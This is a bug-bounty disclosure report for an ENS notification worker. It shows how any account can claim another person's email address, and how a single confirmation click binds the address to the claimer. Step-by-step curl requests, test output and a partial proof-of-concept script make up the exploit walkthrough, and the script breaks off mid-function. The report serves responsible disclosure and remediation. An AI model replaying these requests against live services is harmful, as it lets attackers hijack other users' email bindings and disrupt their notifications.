# 91487 w a low api worker user channels never enforces one verified owner per email target

**Submitted on Sep 1st 2026 at 22:32:04 UTC by @zaaf for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #91487
* **Report Type:** Websites & Apps
* **Report severity:** Low
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/workers>
* **Impacts:**
  * Changing sensitive details of other users (including modifying browser local storage) without already-connected wallet interaction and with up to one click of user interaction, such as: Email

## Description

## Brief/Intro

The invariant is that at most one verified owner may exist for `(channel='email', target)`, and neither the application nor the schema enforces it. Its only unique constraint is `user_channel_unique` on `(user_id, channel, target)` (`core/database/schema/notifications.ts:74`), and the cross-user guard on `POST /notifications/channels/email` filters on `status = 'verified'` (`app/routes/notifications/channels/email.ts:59-65`), so a pending claim is invisible to it. `POST /notifications/channels/email/verify` then resolves a token and flips the row that token names, without re-asking whether the address has been claimed since the token was minted (`email.ts:179-201`).

Any authenticated account can therefore claim any address no other account has verified; ENS composes the confirmation mail and hands it to SendGrid itself; one click by the recipient binds the address to the claiming account, and the address's real owner is then refused when they try to link it. Downstream, the SendGrid event webhook and the push delivery service locate a channel with `where target = …` and no owner predicate, so a genuine signed provider event lands on whichever row the database happens to return.

The work was done at `1c9b47f`, the head of `audit-comp-ready`, whose tree is the audited revision `63772fd872af472ced58b009499355f3430c2a86` plus one dependency bump (`d35fbdf`, hono 4.12.18 to 4.12.34).

## Vulnerability Details

**Missing control:** a relationship between the caller and the address at claim time, a re-check of that claim at verify time, and an owner predicate on the four queries that later locate a channel by its target string.

**Where**, in `workers/api-worker/src`:

* `app/routes/notifications/channels/email.ts:59-65`: the cross-user guard reads `and(eq(channel,'email'), eq(target,email), eq(status,'verified'))`. A `pending` row is invisible to it, so two accounts can hold the same address at the same time.
* `app/routes/notifications/channels/email.ts:75-97`: the row is written for the caller with no check of any kind that the caller can receive mail at that address.
* `app/routes/notifications/channels/email.ts:179-201`: verify resolves the token globally and flips `user_channels.status` to `verified` by `verification.channel_id`. Between the mail being sent and the link being clicked the address can have been verified by somebody else, and nothing here looks.
* `app/routes/webhook/sendgrid.ts:172-174`: `findFirst({ where: eq(TABLE.userChannels.target, event.email) })`. No `user_id`, no `eq(channel,'email')`, no `orderBy`. Lines 188-231 then write `bounced` or `unsubscribed` onto whichever row that returned.
* `services/delivery/push.ts:54-59`: the same shape, reading the `data` column, which holds the Web-Push encryption keys used to encrypt one user's notification.
* `services/delivery/push.ts:118-124`: `update(userChannels).set({status:'unsubscribed'}).where(eq(target, …))`.
* `queues/dlq.ts:202-209`: `update(userChannels).set({status:'bounced'}).where(eq(target, delivery.target))`, with no owner predicate, no channel-type predicate and no limit. Seven lines earlier, `:199` updates `notification_deliveries` **by id**. This one is listed as the same root cause in a fourth place; no reachable trigger for it is claimed, because `classifyDeliveryError` reaches `hard_bounce` only on a provider string about a mailbox that does not exist, and the attacker supplies no part of that string.

**Discriminating control:** the same codebase does it correctly one file away. `app/routes/notifications/channels/$id.ts:39-42` reads:

```ts
where: and(
  eq(TABLE.userChannels.user_id, userId),
  eq(TABLE.userChannels.id, channelId),
),
```

The sibling handlers at `:117-122` and `:150-155` do the same. The claim route is not careless about ownership either: it scopes its own-row lookup by `user_id` (`email.ts:40-46`) and the verify route updates by `verification.channel_id` (`:201`). What is absent is narrower than a missing `user_id` predicate: it is any statement, in code or in the schema, that a *verified* binding on an address belongs to one account.

Rather than cite that guard, the proof of concept runs it: against an address a user has already verified, the attacker's `POST` returns `400 {"error":"This email address is already linked to another account"}` and no row is written. It exists, it fires, and every `200` below is measured against a gate that demonstrably works.

**Excluded-premise check:** the attacker does not send, modify or host the message or the link, and the application itself solicits the only interaction the exploit uses.

**Known-issue check.** `R2-05` is *"SendGrid event webhook fails open when the verification key is unset"*. That is a different root cause and it is fixed on this revision: `webhook/sendgrid.ts:110-116` returns `500` when the key is missing or whitespace, and the unsigned-request control below returns `401`. What is reported here is a **post-verification authorization** defect on the same handler: a correctly signed, genuinely-from-SendGrid event resolves to the wrong owner.

`R2-04` is the Explorer OG-image worker. `EXP-INPUT-009` is the Manager's handling of a push notification **click**. `R3-05` through `R3-08` are `packages/transaction-manager` state-machine entries. Counted across the whole corpus, `workers/api-worker` receives two of the twenty-five Part 1 entries, R2-05 and R2-04, and neither concerns channel registration, channel verification or the delivery queues. No Part 2 QA or bug-tracker entry touches them either.

## Impact Details

The chain, in the order it runs:

1. An account with no relationship to an address posts that address to `POST /notifications/channels/email`.
2. A `pending` row is written for the caller.
3. ENS itself composes a genuine confirmation mail and hands it to SendGrid, from its own sender, for delivery to that address.
4. The recipient clicks the confirmation link once.
5. The token parsed out of the captured mail drives one unauthenticated `POST /notifications/channels/email/verify`.
6. The row flips to `verified`.
7. The real owner of the address is refused with `400 {"error":"This email address is already linked to another account"}` when trying to link the same address.

Two requests separate the claim from the binding, one on the attacker's bearer and one unauthenticated, and the run asserts that no request at all is made with the address owner's session.

**The object that changes is the binding, not the string.** The security-sensitive object here is not the email address, which the attacker supplied and already knew. It is the verified ownership binding between an account and an address, and the application accepts the recipient's verification click as proof of authority for an account that is not theirs. That binding is what `status = 'verified'` means everywhere else in this worker: it is the predicate the delivery fan-out selects on (`queues/event-ingestion.ts:279-283`), the predicate the cross-user guard trusts, and the thing the address owner loses.

After the click the attacker's account holds it, and the victim's account cannot obtain it through the linking route.

**The row this sits on, in the programme's own words:** *"Changing sensitive details of other users (including modifying browser local storage) without already-connected wallet interaction and with up to one click of user interaction, such as: Email"*. What changes for the address owner is which account the platform treats as the verified owner of their email, and with it their ability to use their own address on the platform at all. That one click is the allowance the row itself grants, and it is spent on ENS's own confirmation link rather than on anything the attacker wrote. No wallet interaction is involved at any point.

**What is and is not mutated.** Read strictly, *"changing sensitive details of other users"* can be taken to require a mutation of a record the victim owns, and in the one-click chain no victim-owned row is mutated. What is mutated is the binding, and with it the victim's ability to use their own address: the attacker's row becomes `verified` on the victim's address, and the victim's own `POST` is refused. A row the victim owns is mutated only in the two-row state, which needs a second click, is labelled separately below and is not counted toward this row.

**Attacker:** any holder of a session, obtained by signing SIWE with a wallet they generate themselves. No allow-list, no funds, no name, no prior relationship to the victim. The proof of concept generates its wallets in the file and obtains every session through `POST /auth/nonce` and `POST /auth/login`.

**Victim:** the owner of an email address that is not currently verified on the platform.

**User interaction:** exactly one, by the victim, on an authentic ENS confirmation email they did not request. The run measures that count rather than asserting it: from the claim to the binding it records two requests, one `POST /notifications/channels/email` carrying the attacker's bearer and one unauthenticated `POST /notifications/channels/email/verify` carrying the token parsed out of the mail, and zero requests carrying the address owner's session.

**Gain (measured):** with that one click the address is bound to the attacker's account as one `user_channels` row, `user_id` = the attacker, `status` = `verified`, and the address's owner is refused when they try to link it. Nothing in the product surfaces the row that is holding their address, because every `:id` channel route is scoped to the caller (`$id.ts:39-42`, `:117-122`, `:150-155`).

Both arms that measure that sit in the two-row state below, where the address owner's own channel list returns one entry, theirs, and `DELETE /notifications/channels/<the other account's row>` returns `404`. From then on, ENS notification mail generated by the attacker's account is delivered by ENS's verified sender to the victim's mailbox.

**One route back exists, it was measured, and the product never names it.** While the attacker's row is the only row, a spamreport against that mail marks it `bounced`, and the address owner's next `POST` then succeeds (`200`). A recipient who thinks to mark the mail as spam recovers the address. Nothing in the interface tells them that, and the error message they see offers no path at all.

**A further demonstrated consequence, which needs a second click and is not counted toward the row above.** If the recipient clicks both of the identical ENS confirmation mails, their own and the attacker's, the end state is two `verified` rows, two `user_id`s, one target, created entirely through the shipped routes. In that state the recovery above inverts.

A genuine ECDSA-P-256-signed SendGrid `spamreport` for that address disabled **the address owner's** row in every one of the six trials the proof of concept runs, on each of three separately created databases; a signed `unsubscribe`, the footer of the very mail the attacker caused, did the same. Afterwards the owner's own expiry notification queues **zero** email deliveries while the attacker's channel stays `verified` and keeps sending, and the owner has no self-service repair:

* `POST /notifications/channels/<their row>/resend` returns `400` because the row is not `pending` (`$id.ts:161-171`).
* Re-adding the address meets the same guard as before.

**What the query decides and what it does not.** `sendgrid.ts:172` carries no `orderBy`, so which of the two rows is returned is PostgreSQL's choice and not the application's. In the configuration pinned below it was the address owner's row in 6/6 trials on all three databases. The reverse click order is printed without being asserted, because it came out `["VICTIM","VICTIM","VICTIM"]` on one of those databases and `["attacker","attacker","attacker"]` on the other two. Both observations say the same thing about the code: nothing in it expresses a preference for the legitimate owner.

**Executed end-to-end:** yes, through the shipped `app` object from `src/app/index.ts`, the shipped SIWE service, the shipped channel routes, the shipped webhook handler with real ECDSA-P-256 signature verification, and the shipped `createNotification` service, against a PostgreSQL loaded with this repository's own migrations. Production runs on Neon, which is PostgreSQL (`src/core/database/index.ts:4`).

Nothing left this machine: `globalThis.fetch` is replaced for the whole run by a stub that answers `api.sendgrid.com` in process and throws for every other host, and the run asserts that the real `fetch` was never reached.

**Verified out of band:** every state claim is read back from the database with SQL against `user_channels`, `channel_verifications`, `notifications` and `notification_deliveries`, not taken from a route's response body. The one claim that is deliberately *not* read from the database is the confirmation token: that comes from the captured mail body, so the click is measured as the recipient would perform it.

**Not claimed.** The victim's email address is not disclosed to the attacker by this defect. An attacker supplies the address rather than learning it, and no route returns another user's channel target (`services/notifications/helpers.ts:19-27,141,162` maps a push endpoint to an unsalted `endpointHash` and every channel route is `user_id`-scoped). What the endpoint does disclose is whether a given address is already verified on another account: the same request returns `400` for such an address and `200` for one nobody holds, and both arms are asserted below.

Nothing here is claimed to affect a name, a registration, a renewal or any on-chain state, and no measurement in this work connects a disabled notification channel to a lost name. The in-app notification is still created and `GET /notifications` still returns it. Only the external delivery is lost, and both halves of that are asserted below rather than glossed.

**The push channel, and why it is a paragraph and not a report.** `channels/push.ts:71-77` scopes its duplicate check to `eq(user_id, userId)`. It has no cross-user check at all, where `email.ts:59-65` one file over has one, and `:112-113` inserts the new row `status: 'verified'` outright. So a second account can claim a push endpoint with no click and no confirmation, which makes `services/delivery/push.ts:54-59` hand one user's notification to another user's encryption keys.

Doing that needs the victim's Web-Push endpoint URL, which is a bearer capability this application never discloses; no path to it was found and none is claimed. No such secret is needed by the email variant above. `queues/dlq.ts:209` has no channel-type predicate either; today no string satisfies two of the three target namespaces at once (`isAllowedPushEndpoint`, a Telegram id, and `v.email()`), so that one is recorded as latent rather than live.

## References

* `workers/api-worker/src/app/routes/notifications/channels/email.ts` lines 40-46, 59-65, 75-97, 104-120, 126-140, 179-201
* `workers/api-worker/src/app/routes/notifications/channels/$id.ts` lines 39-42, 117-122, 150-155, 161-171
* `workers/api-worker/src/app/routes/notifications/channels/push.ts` lines 71-77, 79-98, 101-113
* `workers/api-worker/src/app/routes/webhook/sendgrid.ts` lines 110-116, 128-152, 167-239
* `workers/api-worker/src/services/delivery/push.ts` lines 54-59, 118-124
* `workers/api-worker/src/services/email/verification.ts` lines 16, 20-24, 26, 30-38: where `verificationUrl` is assembled and placed in the message the proof of concept captures
* `workers/api-worker/src/services/email/utils.ts` lines 8, 27-39: the `POST https://api.sendgrid.com/v3/mail/send` the capture intercepts
* `workers/api-worker/src/queues/dlq.ts` lines 195-209
* `workers/api-worker/src/services/notifications/create.ts` lines 116-123
* `workers/api-worker/src/queues/event-ingestion.ts` lines 279-283: the scheduled fan-out applies the same verified-only filter
* `workers/api-worker/src/core/database/index.ts` line 4
* `workers/api-worker/src/core/database/schema/notifications.ts` line 74: `user_channel_unique` is `(user_id, channel, target)`, so the schema permits two owners of one target by construction

## Proof of Concept

`workers/api-worker/src/poc/email-channel-ownership.poc.ts`, reproduced in full at the end of this section, with its pinned output `workers/api-worker/src/poc/EXPECTED_email-channel-ownership.txt`.

It drives the shipped `app` object directly, with no HTTP server, no proxy and no rewriting of any route, and prints one `PASS` line per load-bearing claim, including the negative controls and the network boundary.

### Prerequisites

One local service. It reaches no public network.

```bash
docker run -d --name poc-pg -p 55432:5432 \
  -e POSTGRES_USER=postgres -e POSTGRES_PASSWORD=postgres -e POSTGRES_DB=postgres postgres:16
```

The repository's migrations open with `CREATE EXTENSION IF NOT EXISTS pg_uuidv7;` and this repository's own `Dockerfile` builds that extension from source. To keep the reproduction offline, a pure-SQL `uuid_generate_v7()` is supplied instead and the extension line is skipped; nothing else about the schema is changed, and every migration file is applied verbatim. Paste this exactly:

```bash
docker exec -i poc-pg psql -U postgres -q <<'SQL'
CREATE EXTENSION IF NOT EXISTS pgcrypto;
CREATE OR REPLACE FUNCTION uuid_generate_v7() RETURNS uuid AS $$
  SELECT encode(
    set_bit(
      set_bit(
        overlay(uuid_send(gen_random_uuid())
                placing substring(int8send(floor(extract(epoch from clock_timestamp()) * 1000)::bigint) from 3)
                from 1 for 6),
        52, 1),
      53, 1), 'hex')::uuid;
$$ LANGUAGE sql VOLATILE;
SQL

cd workers/api-worker
for f in drizzle/0000_*.sql drizzle/0001_*.sql drizzle/0002_*.sql drizzle/0003_*.sql drizzle/0004_*.sql; do
  sed 's/CREATE EXTENSION IF NOT EXISTS pg_uuidv7;/SELECT 1;/' "$f" \
    | sed 's|--> statement-breakpoint||' \
    | docker exec -i poc-pg psql -U postgres -v ON_ERROR_STOP=1 -q
done
```

If you prefer the repository's own container, `docker compose -f workers/api-worker/compose.yaml up -d postgres` ships `pg_uuidv7` and needs no shim; only the port changes.

### Reproduction

```bash
pnpm install --frozen-lockfile
cd workers/api-worker
./node_modules/.bin/vitest run --config vitest.poc.config.ts \
  --silent=false --disableConsoleIntercept src/poc/email-channel-ownership.poc.ts
```

### What each numbered step does, and who does it

The proof of concept performs all of these in one process. They are listed so the sequence can be followed and, if you would rather see requests than assertions, re-run against the worker's own dev server.

Start it with:

```bash
DATABASE_URL=postgres://postgres:postgres@127.0.0.1:55432/postgres JWT_SECRET=poc-secret ./node_modules/.bin/wrangler dev --port 8787
```

Replace `https://api.test` with `http://127.0.0.1:8787` in each URL below. The steps are ordered the way this write-up narrates them, one-click chain first; the proof of concept runs the two-row scenario before the one-click scenario, and the addresses below are the ones it actually allocates.

{% stepper %}
{% step %}

## As the attacker

`POST /auth/nonce` then `POST /auth/login`, signing with a wallet generated on the spot. The nonce comes back from the first call and a bearer token from the second; the same two calls give the victim a session.

```bash
curl -s -X POST http://127.0.0.1:8787/auth/nonce
```

{% endstep %}

{% step %}

## As the victim (control)

`POST /notifications/channels/email` for `owner-1@example.com` and confirm it, so the guard has something to fire against.

```bash
curl -s -X POST http://127.0.0.1:8787/notifications/channels/email -H "Authorization: Bearer $VICTIM" -H 'Content-Type: application/json' -d '{"email":"owner-1@example.com"}'
```

{% endstep %}

{% step %}

## As the attacker (negative control)

`POST /notifications/channels/email` for the address the victim just verified.

Expected: `400 {"error":"This email address is already linked to another account"}` and one row in `user_channels`. If this returns `200`, stop, because the run would measure nothing.

```bash
curl -s -X POST http://127.0.0.1:8787/notifications/channels/email -H "Authorization: Bearer $ATTACKER" -H 'Content-Type: application/json' -d '{"email":"owner-1@example.com"}'
```

{% endstep %}

{% step %}

## As the attacker

`POST /notifications/channels/email` for an address nobody holds.

Expected: `200`. The two arms differ, so the `400` in the previous step is a statement about that address and not about the endpoint.

```bash
curl -s -X POST http://127.0.0.1:8787/notifications/channels/email -H "Authorization: Bearer $ATTACKER" -H 'Content-Type: application/json' -d '{"email":"nobody-holds-this@example.com"}'
```

{% endstep %}

{% step %}

## As the attacker

`POST /notifications/channels/email` for `owner-3@example.com`, an address belonging to somebody else.

Expected: `200`, and a `pending` row owned by the attacker.

```bash
curl -s -X POST http://127.0.0.1:8787/notifications/channels/email -H "Authorization: Bearer $ATTACKER" -H 'Content-Type: application/json' -d '{"email":"owner-3@example.com"}'
```

{% endstep %}

{% step %}

## ENS sends the confirmation mail

ENS, not the attacker, posts the confirmation mail to `https://api.sendgrid.com/v3/mail/send`. In the proof of concept that request is intercepted in process and its body is kept, so the message can be read the way its recipient would read it:

* `personalizations[0].to[0].email` is `owner-3@example.com`.
* The subject is `Verify your email address - ENS Notifications`.
* The `text/plain` part carries `https://app.ens.dev/notifications/channels/email/verify?token=<32 hex characters>`.
* The `text/html` part puts the same URL behind its button.

Against the dev server, read the same line out of the worker's log (`services/email/verification.ts:90-93` logs `verificationUrl`), or out of the mail itself if a real SendGrid key is configured.
{% endstep %}

{% step %}

## As the owner of `owner-3@example.com`

`POST /notifications/channels/email/verify` with the token taken out of that link. This is the one click, and it is the only interaction the address owner makes.

Expected: `200`, and the attacker's row is now `verified`.

```bash
curl -s -X POST http://127.0.0.1:8787/notifications/channels/email/verify -H 'Content-Type: application/json' -d '{"token":"<the token in the link ENS mailed to owner-3@example.com>"}'
```

{% endstep %}

{% step %}

## As the owner of `owner-3@example.com`

`POST /notifications/channels/email` to link your own address to your own account.

Expected: `400 {"error":"This email address is already linked to another account"}`. This is the end of the one-click chain; the steps below use a different address to reach the two-row state.

```bash
curl -s -X POST http://127.0.0.1:8787/notifications/channels/email -H "Authorization: Bearer $OWNER3" -H 'Content-Type: application/json' -d '{"email":"owner-3@example.com"}'
```

{% endstep %}

{% step %}

## As the attacker

`POST /notifications/channels/email` for `owner-2@example.com` and leave the row `pending`.

Expected: `200`.

```bash
curl -s -X POST http://127.0.0.1:8787/notifications/channels/email -H "Authorization: Bearer $ATTACKER" -H 'Content-Type: application/json' -d '{"email":"owner-2@example.com"}'
```

{% endstep %}

{% step %}

## As the owner of `owner-2@example.com`

`POST /notifications/channels/email` for your own address.

Expected: `200`, because the guard filters on `status = 'verified'` and does not see the attacker's `pending` row, so `user_channels` now holds two rows for one address.

```bash
curl -s -X POST http://127.0.0.1:8787/notifications/channels/email -H "Authorization: Bearer $OWNER2" -H 'Content-Type: application/json' -d '{"email":"owner-2@example.com"}'
```

{% endstep %}

{% step %}

## As the owner of `owner-2@example.com`

`POST /notifications/channels/email/verify` twice, once for your own confirmation mail and once for the attacker's, both of which arrived in your mailbox from ENS with the same subject and the same body.

Expected: `200` both times, and two `verified` rows with two different `user_id`s on one target.

```bash
curl -s -X POST http://127.0.0.1:8787/notifications/channels/email/verify -H 'Content-Type: application/json' -d '{"token":"<the token in the second mail>"}'
```

{% endstep %}

{% step %}

## As the owner of `owner-2@example.com`

`GET /notifications/channels`, then `DELETE /notifications/channels/<the attacker's row id>`.

Expected: the list contains one channel, which is yours, and the delete returns `404`.

```bash
curl -s http://127.0.0.1:8787/notifications/channels -H "Authorization: Bearer $OWNER2"
```

{% endstep %}

{% step %}

## As SendGrid

`POST /webhook/sendgrid/events` with a correctly signed `spamreport` for `owner-2@example.com`.

Expected: `200`, and the address owner's row is the one set to `bounced`. The proof of concept generates its own ECDSA P-256 key pair, sets it as `SENDGRID_WEBHOOK_VERIFICATION_KEY`, and signs `timestamp + body` the way SendGrid does; the same request unsigned returns `401`, which is asserted first.
{% endstep %}

{% step %}

## As the owner of `owner-2@example.com`

Have an expiry notification created for one of your own names, then `GET /notifications`.

Expected: the `notifications` row is created and the feed returns it, and `notification_deliveries` gains **zero** email rows, where before the event it gained one.

```bash
curl -s http://127.0.0.1:8787/notifications -H "Authorization: Bearer $OWNER2"
```

{% endstep %}
{% endstepper %}

### Observed output

```
PASS the attacker session is issued by the shipped SIWE routes to a wallet generated in this file :: POST /auth/nonce -> 200, POST /auth/login -> 200
PASS negative control: against a verified row the cross-user guard refuses the attacker and writes nothing :: POST /notifications/channels/email -> 400 "This email address is already linked to another account", user_channels rows = 1
PASS the same endpoint answers 200 for an address no other account has verified, so the 400 above is a statement about that address :: POST /notifications/channels/email for an unheld address -> 200
PASS an account with no relationship to the address may claim it: the row is created pending and ENS mails the confirmation link to the address :: POST /notifications/channels/email -> 200, status = pending
PASS the cross-user guard filters on status = verified, so it does not see the pending row and the real owner is allowed in :: POST /notifications/channels/email as the address owner -> 200, user_channels rows = 2
PASS both confirmation mails were posted to that one mailbox and are indistinguishable to its owner: same subject, same body once the token is masked :: two POSTs to https://api.sendgrid.com/v3/mail/send, both to owner-2@example.com, subject "Verify your email address - ENS Notifications", bodies identical with the token masked
PASS POST /notifications/channels/email/verify never re-checks the claim, so the second confirmation is accepted after the address is already verified elsewhere :: first verify -> 200, second verify -> 200
PASS end state, reached entirely through the shipped routes: one address, two verified user_channels rows, two different owners :: verified rows = 2, distinct user_id = 2
PASS the address owner cannot delete the other row: DELETE /notifications/channels/:id is scoped to the caller :: DELETE /notifications/channels/<the other row> as the address owner -> 404
PASS the address owner is never shown the other row, so nothing in the product reports the state :: GET /notifications/channels as the address owner returns 1 channel
PASS having removed their own row the address owner can no longer link their own address, because the row that survives is verified :: POST /notifications/channels/email -> 400 "This email address is already linked to another account"
PASS the mail ENS composed for the other account's claim is addressed to the address owner's own mailbox and carries an ENS confirmation link :: POST https://api.sendgrid.com/v3/mail/send, personalizations[0].to[0].email = owner-3@example.com, subject = "Verify your email address - ENS Notifications", link = https://app.ens.dev/notifications/channels/email/verify?token=<32 hex characters>
PASS the confirmation is driven by the token parsed out of the mail body, not by a value read from the database :: POST /notifications/channels/email/verify carrying the token from the mailed link -> 200, and that string matches the one channel_verifications held, compared afterwards as a check
PASS the address owner interacts exactly once: one unauthenticated confirmation request carrying a token that came from the mail, and no request at all made with their session :: requests from the claim to the binding = 2: 1 POST /notifications/channels/email on the other account's bearer, 1 unauthenticated POST /notifications/channels/email/verify; victim interactions = 1, requests carrying the address owner's session = 0
PASS one click on the confirmation mail is enough: the address is bound to the other account and the address owner is refused :: user_channels rows = 1 owned by the other account, the address owner's POST -> 400 "This email address is already linked to another account"
PASS the address owner does have a route back while that row is the only one, and the product never names it: marking the mail as spam disables the other account's row, after which the address can be linked again :: the other account's row -> bounced, the address owner's POST -> 200
PASS negative control: an unsigned event is rejected, so the 200s below are not a disabled gate :: POST /webhook/sendgrid/events with no signature -> 401
PASS control: with one holder, a signed spamreport disables exactly that holder :: POST /webhook/sendgrid/events -> 200, that row -> bounced
PASS in the natural order — the attacker confirms last — the row a signed spamreport disables is the address owner's, over three trials :: disabled row per trial = ["VICTIM","VICTIM","VICTIM"]
reverse order (the attacker confirms first), not asserted: ["VICTIM","VICTIM","VICTIM"]
PASS in every trial of both orders exactly one of the two rows is disabled and the other keeps sending, and nothing in the query says which :: six trials, one row disabled each time, selected without reference to ownership
PASS the unsubscribe footer of the mail the other account caused resolves to the same row: a signed unsubscribe event disables the address owner and leaves the other row verified :: POST /webhook/sendgrid/events (unsubscribe) -> 200, the address owner -> unsubscribed, the other row stays verified
PASS control: before the event, the address owner's own expiry notification queues one email delivery :: notification_deliveries for the address owner = 1
PASS after the event, the same notification queues no email delivery for the address owner, while the in-app row is still created :: email deliveries = 0, in-app notifications rows = 1
PASS the address owner is still notified in the product: GET /notifications returns the same events, so what is lost is the external copy :: GET /notifications as the address owner returns 2 notifications
PASS the other account keeps a verified channel on the address, so ENS mail addressed to that mailbox continues on its behalf :: verified rows remaining on that address = 1
PASS the address owner has no self-service repair: resend refuses anything that is not pending, and re-adding hits the guard measured above :: POST /notifications/channels/:id/resend on the disabled row -> 400
PASS network boundary: the real fetch was never reached; the shipped code addressed only api.sendgrid.com, answered in process, and the closed local port :: hosts addressed = ["127.0.0.1","api.sendgrid.com"]
 Test Files  1 passed (1)
      Tests  1 passed (1)
```

The 27 `PASS` lines are byte-stable and are pinned in the `EXPECTED_email-channel-ownership.txt` included below, so the run can be checked with `cmp` rather than read:

```bash
./node_modules/.bin/vitest run --config vitest.poc.config.ts \
  --silent=false --disableConsoleIntercept src/poc/email-channel-ownership.poc.ts 2>&1 \
  | grep -E '^(PASS|FAIL)' | cmp - src/poc/EXPECTED_email-channel-ownership.txt
```

That comparison was run against three separately created databases, the container above and two others carrying the same migrations, and produced no difference in any of them. The single line deliberately kept outside the assertions is the reverse click order, which came out `["VICTIM","VICTIM","VICTIM"]` on the first of those three and `["attacker","attacker","attacker"]` on the other two, so it is printed and not asserted.

### Substitutions, all of them declared

* `getDatabase` is pointed at `drizzle-orm/node-postgres` instead of `neon-http`, because workerd's neon-http fetch driver does not run under plain Node. Every route handler, middleware, Drizzle query and error path is shipped code.
* Three queue bindings are objects that record the job instead of sending it, so the number of queued deliveries is readable. Delivery rows themselves are written by `services/notifications/create.ts`.
* `SEPOLIA_RPC_URL` points at a closed local port; viem's `verifySiweMessage` falls back to local ECDSA recovery when the RPC call fails, so the EOA signature path is the shipped one.
* `globalThis.fetch` answers `api.sendgrid.com` with `202` and throws for every other host. For a request to `/v3/mail/send` it first keeps `init.body`, which is the message `services/email/utils.ts:36` serialises, so the confirmation link the recipient would click is read out of the mail the shipped code composed rather than out of the database.
* An ECDSA P-256 key pair generated inside the run supplies the webhook verification key. What the handler checks is that the signature is consistent with the configured key, not who generated it; the unsigned control returning `401` shows the verification is genuinely running.
* `createNotification` is invoked directly rather than through the DEV-only `/notifications/test` route. It is the shipped function, and the scheduled batch path selects channels with the same `eq(status, 'verified')` filter (`queues/event-ingestion.ts:279-283`), so a `bounced` row produces no delivery on either path.
* Each scenario uses its own address (`owner-1@…`, `owner-2@…`, and so on), because the verification-mail quota is keyed on the address alone (`services/notifications/email-verification-rate-limit.ts`) and reusing one address across scenarios would spend it. Nothing else depends on the address.

### Recommendation

At claim time, refuse a target that any other user already holds in any status, not only `verified`. At verify time, re-run that check inside the same transaction that flips the row, and fail the verification if the address has been claimed since the token was minted.

Give `user_channels` a partial unique index on `(channel, target)` where `status = 'verified'`, so the invariant is the database's rather than a handler's.

Add `eq(userChannels.user_id, …)`, and in `dlq.ts` also `eq(userChannels.channel, delivery.channel)`, to the three delivery-side queries (`services/delivery/push.ts:54-59` and `:118-124`, `queues/dlq.ts:209`); the owning user is one join away at each of them, through `notification_deliveries.notification_id` to `notifications.user_id`.

`webhook/sendgrid.ts:172` is the one place that predicate cannot help, because a provider event names only the address, so there the fix is the uniqueness above plus `eq(userChannels.channel, 'email')`.

Finally, surface the conflict: an address owner who is told *"already linked to another account"* has no route in the product to contest it.

## The proof of concept in full

Immunefi's attachment field accepts images only, so the source is reproduced here rather than attached. Save it as `workers/api-worker/src/poc/email-channel-ownership.poc.ts` and run the command above.

```ts
/**
 * Proof of concept — one click on an ENS confirmation mail binds an address to an account
 * that cannot receive mail at it, and two different accounts can end up holding a
 * `verified` email channel on one address. A genuine signed SendGrid event for that
 * address then disables one of the two rows without reference to ownership, because
 * `user_channels` is located by its target string alone.
 *
 * Run (one command, from workers/api-worker):
 *   ./node_modules/.bin/vitest run --config vitest.poc.config.ts src/poc/email-channel-ownership.poc.ts --silent=false --disableConsoleIntercept
 *
 * Prerequisite: PostgreSQL at POC_PG_URL (default
 * postgres://postgres:postgres@127.0.0.1:55432/postgres) loaded with this repository's
 * own migrations from workers/api-worker/drizzle. The report's Proof of Concept section
 * gives the exact container and migration commands.
 *
 * Nothing leaves this machine. `globalThis.fetch` is replaced for the whole run by a stub
 * that answers api.sendgrid.com in process and THROWS for every other host, so the
 * network boundary is asserted rather than promised. The stub keeps the request body of
 * every message the shipped code posts to /v3/mail/send, and the token the recipient
 * clicks is parsed out of that captured mail rather than read out of
 * channel_verifications, so the single click is measured end to end. Both wallets are
 * generated in this file and both sessions are obtained through the shipped SIWE routes.
 *
 * Substitutions, all of them declared:
 *   1. `getDatabase` is pointed at node-postgres instead of neon-http, because workerd's
 *      neon-http fetch driver cannot run under plain Node. Production is Neon, i.e. the
 *      same PostgreSQL engine (src/core/database/index.ts:4).
 *   2. The queue bindings are objects that record the job instead of sending it, so the
 *      count of queued deliveries is readable. The rows are written by shipped code.
 *   3. `SEPOLIA_RPC_URL` points at a closed local port. viem's verifySiweMessage falls
 *      back to local ECDSA recovery when the RPC call fails, so the EOA signature path is
 *      the shipped one.
 *   4. Each scenario allocates its own address, because the verification-mail quota is
 *      keyed on the address alone and reusing one would spend it.
 *
 * Which of the two rows a signed event disables is PostgreSQL's choice, not the
 * application's: the query carries no ORDER BY. The natural order — the attacker confirms
 * last — is asserted; the reverse order is printed and NOT asserted, because it came out
 * differently on different databases and after an unrelated SELECT.
 */
import { drizzle } from 'drizzle-orm/node-postgres'
import { Pool } from 'pg'
import { generatePrivateKey, privateKeyToAccount } from 'viem/accounts'
import { createSiweMessage } from 'viem/siwe'
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest'
import * as schema from '#core/database/schema/index.js'

const CONN =
  process.env.POC_PG_URL ?? 'postgres://postgres:postgres@127.0.0.1:55432/postgres'

const pool = new Pool({ connectionString: CONN })
const realDb = drizzle(pool, { schema })
vi.mock('#core/database/index.js', async (importOriginal) => {
  const original = await importOriginal<typeof import('#core/database/index.js')>()
  return { ...original, getDatabase: () => realDb }
})

const { default: app } = await import('#app/index.js')
const { createNotification } = await import('#services/notifications/create.js')

// ---------------------------------------------------------------------------
// network boundary
// ---------------------------------------------------------------------------
const attemptedHosts: string[] = []
let realFetchCalls = 0
const realFetch = globalThis.fetch

/**
 * Every message the shipped code hands to SendGrid, captured out of the request body
 * instead of being thrown away. The token the recipient clicks is parsed from these,
 * not read out of channel_verifications, so the click is measured rather than assumed.
 */
type SentMail = { to: string; subject: string; text: string; html: string }
const sentMail: SentMail[] = []

const captureMail = (url: string, init?: RequestInit) => {
  if (new URL(url).pathname !== '/v3/mail/send') return
  const raw = typeof init?.body === 'string' ? init.body : ''
  if (raw === '') return
  const payload = JSON.parse(raw) as {
    personalizations?: { to?: { email?: string }[] }[]
    subject?: string
    content?: { type?: string; value?: string }[]
  }
  const part = (type: string) =>
    payload.content?.find((c) => c.type === type)?.value ?? ''
  sentMail.push({
    to: payload.personalizations?.[0]?.to?.[0]?.email ?? '',
    subject: payload.subject ?? '',
    text: part('text/plain'),
    html: part('text/html'),
  })
}

beforeAll(() => {
  globalThis.fetch = (async (input: RequestInfo | URL, init?: RequestInit) => {
    const url =
      typeof input === 'string' ? input : input instanceof URL ? input.href : input.url
